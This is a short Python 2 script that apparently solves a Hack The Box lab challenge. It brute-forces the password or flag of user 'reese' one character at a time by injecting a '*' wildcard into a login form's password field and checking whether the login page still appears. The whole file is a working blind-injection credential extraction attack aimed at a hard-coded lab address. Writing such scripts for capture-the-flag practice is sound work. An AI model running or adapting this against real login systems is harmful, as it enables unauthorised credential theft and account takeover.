import re, requests

HTBInstance = "142.93.47.182:31193"  #change the instance

forbidden = {41,42,92}
loop = True
password = ''

while loop:
  for c in range(33,126):
      if c not in forbidden:
        try_password = password + chr(c)
        print try_password
        try_password = try_password + '*'
        data = {'username':'reese', 'password':try_password}
        r = requests.post("http://"+HTBInstance+"/login", data=data)
        if r.status_code != 200:
            print "ERRO"
            exit()
        else:
            if re.search('Login',r.text) == None: 
              password = password + chr(c)
              if chr(c) == '}':
                  loop = False
                  print 'FINISH: ' + password
                  exit()
